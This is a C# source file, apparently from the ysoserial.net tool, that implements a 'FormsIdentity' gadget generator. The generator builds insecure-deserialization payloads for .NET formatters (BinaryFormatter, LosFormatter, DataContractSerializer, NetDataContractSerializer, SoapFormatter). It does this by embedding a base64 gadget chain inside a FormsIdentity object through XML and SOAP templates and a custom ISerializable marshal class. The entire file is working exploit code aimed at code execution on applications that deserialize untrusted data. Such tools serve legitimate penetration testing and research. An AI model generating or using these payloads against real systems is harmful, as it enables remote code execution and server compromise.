using System;
using System.Collections.Generic;
using System.Runtime.Serialization;
using ysoserial.Helpers;
using System.Web.Security;

namespace ysoserial.Generators
{
    public class FormsIdentityGenerator : GenericGenerator
    {

        public override List<string> SupportedFormatters()
        {
            return new List<string> { "BinaryFormatter", "DataContractSerializer", "NetDataContractSerializer", "SoapFormatter", "LosFormatter" };
        }

        public override string Name()
        {
            return "FormsIdentity";
        }

        public override string Finders()
        {
            return "Hugo VINCENT, Pierre GERTNER";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTypes.BridgeAndDerived };
        }

        public override string SupportedBridgedFormatter()
        {
            return Formatters.BinaryFormatter;
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            byte[] binaryFormatterPayload;
            if (BridgedPayload != null)
            {
                binaryFormatterPayload = (byte[])BridgedPayload;
            }
            else
            {
                IGenerator generator = new TextFormattingRunPropertiesGenerator();
                binaryFormatterPayload = (byte[])generator.GenerateWithNoTest("BinaryFormatter", inputArgs);
            }

            string b64encoded = Convert.ToBase64String(binaryFormatterPayload);


            if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase)
                || formatter.Equals("losformatter", StringComparison.OrdinalIgnoreCase))
            {
                Object obj = null;
                obj = new FormsIdentityMarshal(b64encoded);

                return Serialize(obj, formatter, inputArgs);
            }
            else if (formatter.ToLower().Equals("datacontractserializer"))
            {

                string payload = $@"<root type=""System.Web.Security.FormsIdentity, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"">
<FormsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" xmlns=""http://schemas.datacontract.org/2004/07/System.Web.Security"">
  <m_serializedClaims xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Claims"">{b64encoded}</m_serializedClaims>
  <_Ticket>
    <_CookiePath>/</_CookiePath>
    <_Expiration>1337-07-06T07:41:18.0853847+02:00</_Expiration>
    <_InternalData i:nil=""true"" />
    <_InternalVersion>0</_InternalVersion>
    <_IsPersistent>false</_IsPersistent>
    <_IssueDate>1337-07-06T07:11:18.0473886+02:00</_IssueDate>
    <_Name>synacktiv</_Name>
    <_UserData>CustomUserData</_UserData>
    <_Version>1</_Version>
  </_Ticket>
</FormsIdentity>
</root>";

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "System.Web" }, null);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.DataContractSerializer_deserialize(payload, null, "root", "type");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("netdatacontractserializer"))
            {

                string payload = $@"<root>
<FormsIdentity xmlns:i=""http://www.w3.org/2001/XMLSchema-instance"" z:Id=""1"" z:Type=""System.Web.Security.FormsIdentity"" z:Assembly=""System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"" xmlns:z=""http://schemas.microsoft.com/2003/10/Serialization/"" xmlns=""http://schemas.datacontract.org/2004/07/System.Web.Security"">
  <m_serializedClaims z:Id=""2"" xmlns=""http://schemas.datacontract.org/2004/07/System.Security.Claims"">{b64encoded}</m_serializedClaims>
  <_Ticket z:Id=""6"">
    <_CookiePath z:Id=""7"">/</_CookiePath>
    <_Expiration>1337-07-06T07:36:36.134256+02:00</_Expiration>
    <_InternalData i:nil=""true"" />
    <_InternalVersion>0</_InternalVersion>
    <_IsPersistent>false</_IsPersistent>
    <_IssueDate>1337-07-06T07:06:36.134256+02:00</_IssueDate>
    <_Name z:Id=""8"">synacktiv</_Name>
    <_UserData z:Id=""9"">CustomUserData</_UserData>
    <_Version>1</_Version>
  </_Ticket>
</FormsIdentity>
</root>
";
                

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "System.Web" }, null);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.NetDataContractSerializer_deserialize(payload, "root");
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else if (formatter.ToLower().Equals("soapformatter"))
            {

                string payload = $@"<SOAP-ENV:Envelope
	xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
	xmlns:xsd=""http://www.w3.org/2001/XMLSchema""
	xmlns:SOAP-ENC=""http://schemas.xmlsoap.org/soap/encoding/""
	xmlns:SOAP-ENV=""http://schemas.xmlsoap.org/soap/envelope/""
	xmlns:clr=""http://schemas.microsoft.com/soap/encoding/clr/1.0"" SOAP-ENV:encodingStyle=""http://schemas.xmlsoap.org/soap/encoding/"">
	<SOAP-ENV:Body>
		<a1:FormsIdentity id=""ref-1""
			xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Web.Security/System.Web%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
			<_Ticket href=""#ref-3""/>
			<ClaimsIdentity_x002B_m_serializedClaims id=""ref-7"">{b64encoded}</ClaimsIdentity_x002B_m_serializedClaims>
		</a1:FormsIdentity>
		<a1:FormsAuthenticationTicket id=""ref-3""
			xmlns:a1=""http://schemas.microsoft.com/clr/nsassem/System.Web.Security/System.Web%2C%20Version%3D4.0.0.0%2C%20Culture%3Dneutral%2C%20PublicKeyToken%3Db03f5f7f11d50a3a"">
			<_Version>1</_Version>
			<_Name id=""ref-8"">synacktiv</_Name>
			<_Expiration></_Expiration>
			<_IssueDate></_IssueDate>
			<_IsPersistent>false</_IsPersistent>
			<_UserData id=""ref-9"">CustomUserData</_UserData>
			<_CookiePath id=""ref-10"">/</_CookiePath>
			<_InternalVersion>0</_InternalVersion>
			<_InternalData xsi:null=""1""/>
		</a1:FormsAuthenticationTicket>
	</SOAP-ENV:Body>
</SOAP-ENV:Envelope>
";
                

                if (inputArgs.Minify)
                {
                    if (inputArgs.UseSimpleType)
                    {
                        payload = XmlHelper.Minify(payload, new string[] { "System.Web" }, null, FormatterType.SoapFormatter);
                    }
                    else
                    {
                        payload = XmlHelper.Minify(payload, null, null, FormatterType.SoapFormatter);
                    }
                }

                if (inputArgs.Test)
                {
                    try
                    {
                        SerializersHelper.SoapFormatter_deserialize(payload);
                    }
                    catch (Exception err)
                    {
                        Debugging.ShowErrors(inputArgs, err);
                    }
                }
                return payload;
            }
            else
            {
                throw new Exception("Formatter not supported");
            }
        }
    }

    [Serializable]
    public class FormsIdentityMarshal : ISerializable
    {
        public FormsIdentityMarshal()
        {
            B64Payload = "";
        }

        public FormsIdentityMarshal(string b64payload)
        {
            B64Payload = b64payload;
        }

        private string B64Payload { get; }

        public void GetObjectData(SerializationInfo info, StreamingContext context)
        {
            info.SetType(typeof(FormsIdentity));
            info.AddValue("ClaimsIdentity+m_serializedClaims", B64Payload);
        }
    }
}
